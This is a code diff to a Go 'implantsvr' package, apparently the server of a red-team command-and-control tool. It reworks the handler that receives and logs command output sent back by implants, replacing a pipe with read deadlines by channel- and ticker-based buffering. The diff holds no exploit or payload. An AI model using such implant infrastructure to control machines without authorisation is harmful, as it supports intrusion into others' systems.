@@ -5,7 +5,7 @@ package implantsvr
  * HTTP Handlers
  * By J. Stuart McMurray
  * Created 20231207
- * Last Modified 20240120
+ * Last Modified 20240123
  */
 
 import (
@@ -17,7 +17,6 @@ import (
 	"io"
 	"io/fs"
 	"log/slog"
-	"net"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -129,84 +128,93 @@ func (s *Server) handleOutput(w http.ResponseWriter, r *http.Request) {
 	}
 	noteSeen()
 
-	/* Get a timeoutable reader for the body. */
-	cr, cw := net.Pipe()
-	defer cr.Close()
-	defer cw.Close()
-	ech := make(chan error, 2)
+	/* Read chunks of output and make available for logging. */
+	var (
+		och = make(chan string)
+		ech = make(chan error)
+	)
 	go func() {
-		_, err := io.Copy(cw, r.Body)
-		if nil != err {
-			ech <- fmt.Errorf("reading output: %w", err)
-		} else {
-			ech <- nil
+		defer close(och)
+		defer close(ech)
+		var (
+			rbuf = make([]byte, 1024)
+			err  error
+			n    int
+		)
+		for nil == err {
+			n, err = r.Body.Read(rbuf)
+			if 0 != n {
+				och <- string(rbuf[:n])
+			}
+			if nil != err {
+				ech <- err
+				return
+			}
 		}
-		cw.Close()
 	}()
 
-	/* Read chunks of output. */
-	var (
-		gotOutput bool
-		b         bytes.Buffer
-		te        interface{ Timeout() bool }
-	)
-	for {
-		/* Don't re-use output. */
-		b.Reset()
+	/* gotOutput keeps track of if we've seen any output at all, so as to
+	not debug-log an empty read on the last EOF. */
+	var gotOutput bool
 
-		/* Don't wait too long for output. */
-		if err := cr.SetReadDeadline(
-			time.Now().Add(def.OutputWait),
-		); nil != err {
-			/* Something has gone very wrong. */
-			ech <- fmt.Errorf(
-				"setting read deadline: %w",
-				err,
-			)
-			break
-		}
-
-		/* Try to get a chunk of output. */
-		n, err := b.ReadFrom(cr)
-
-		/* Note we've seen the implant. */
+	/* logOutput logs the output in o. */
+	logOutput := func(o string) {
+		/* Got output, send it back. */
+		sl.With(
+			def.LKOutput,
+			strings.TrimRight(o, "\n"),
+		).Info(def.LMOutputRequest)
+		/* Note we did actually get output. */
+		gotOutput = true
+		/* Also note we've seen the implant. */
 		noteSeen()
-
-		/* If we got some, log it and try again if we didn't also get
-		an error. */
-		if 0 != n {
-			sl.With(def.LKOutput, string(
-				bytes.TrimRight(b.Bytes(), "\n"),
-			)).Info(def.LMOutputRequest)
-			gotOutput = true
-			continue
-		}
-
-		/* If we just had a timeout, try again. */
-		if errors.As(err, &te) && te.Timeout() {
-			continue
-		}
-
-		/* Everything else is a real error. */
-		ech <- fmt.Errorf("buffering output: %w", err)
-		break
 	}
 
-	/* For just in case, we'll close the pipe so the goroutine puts
-	something in ech.  This is redundant, but won't hurt. */
-	cr.Close()
-	cw.Close()
+	/* As we get output back, buffer until we've either got an error or
+	have been waiting long enough. */
+	var (
+		ticker = time.NewTicker(def.OutputWait)
+		last   = time.Now()
+		obuf   bytes.Buffer
+		tick   time.Time
+		rerr   error
+	)
+	defer ticker.Stop()
+	for nil == rerr {
+		/* Wait until something happens. */
+		select {
+		case tick = <-ticker.C:
+		case rerr = <-ech:
+		case o := <-och:
+			obuf.WriteString(o)
+		}
+		/* If it's been long enough, send the output. */
+		if 0 != obuf.Len() && (!tick.IsZero() ||
+			time.Since(last) >= def.OutputWait) {
+			last = time.Now()
+			logOutput(obuf.String())
+			obuf.Reset()
+		}
+		tick = time.Time{}
+	}
+	/* Finally got an error.  Make sure the output channel is empty and
+	send the last output back. */
+	for o := range och {
+		obuf.WriteString(o)
+	}
+	if 0 != obuf.Len() {
+		logOutput(obuf.String())
+	}
 
-	/* We should have a proper error by now, which may well not really be
-	an error. */
-	if err := <-ech; nil != err &&
-		!errors.Is(err, io.EOF) &&
-		!errors.Is(err, io.ErrUnexpectedEOF) {
-		plog.WarnError(sl, def.LMOutputRequest, err)
+	/* If we got a read error, let someone know. */
+	if nil != rerr &&
+		!errors.Is(rerr, io.EOF) &&
+		!errors.Is(rerr, io.ErrUnexpectedEOF) {
+		plog.WarnError(sl, def.LMOutputRequest, rerr)
 		return
 	}
 
-	/* If we just didn't get any output, log it for debugging. */
+	/* If we just didn't get any output, log the request for debugging. */
 	if !gotOutput {
 		sl.Debug(def.LMOutputRequest)
 	}
